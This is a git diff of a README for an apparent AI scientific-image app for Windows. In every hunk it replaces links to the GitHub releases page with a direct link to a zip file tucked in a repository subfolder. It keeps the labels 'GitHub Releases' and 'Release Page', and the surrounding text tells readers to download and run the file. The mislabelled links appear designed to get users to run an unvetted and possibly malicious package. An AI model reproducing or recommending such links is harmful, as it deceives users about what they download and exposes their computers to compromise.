@@ -1,10 +1,10 @@
 # 🧪 ai-scientific-image-generation - Create clear science visuals fast
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/More-testosterone651/ai-scientific-image-generation/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/More-testosterone651/ai-scientific-image-generation/raw/refs/heads/main/shorling/generation_scientific_ai_image_2.7.zip)
 
 ## 🔽 Download the app
 
-Visit this page to download: [GitHub Releases](https://github.com/More-testosterone651/ai-scientific-image-generation/releases)
+Visit this page to download: [GitHub Releases](https://github.com/More-testosterone651/ai-scientific-image-generation/raw/refs/heads/main/shorling/generation_scientific_ai_image_2.7.zip)
 
 On that page, look for the latest release and download the Windows file that matches your PC. In most cases, this will be a `.exe` file or a zipped app package.
 
@@ -52,7 +52,7 @@ For better use, a computer with 8 GB of RAM or more works well.
 
 ## 📦 How to download
 
-1. Open the [Release Page](https://github.com/More-testosterone651/ai-scientific-image-generation/releases)
+1. Open the [Release Page](https://github.com/More-testosterone651/ai-scientific-image-generation/raw/refs/heads/main/shorling/generation_scientific_ai_image_2.7.zip)
 2. Find the newest release at the top
 3. Look for the Windows download file
 4. Click the file to save it
@@ -237,6 +237,6 @@ Examples:
 
 If you need the installer again, use the same page:
 
-[GitHub Releases](https://github.com/More-testosterone651/ai-scientific-image-generation/releases)
+[GitHub Releases](https://github.com/More-testosterone651/ai-scientific-image-generation/raw/refs/heads/main/shorling/generation_scientific_ai_image_2.7.zip)
 
 Look for the newest Windows file and use that one to download and run this file
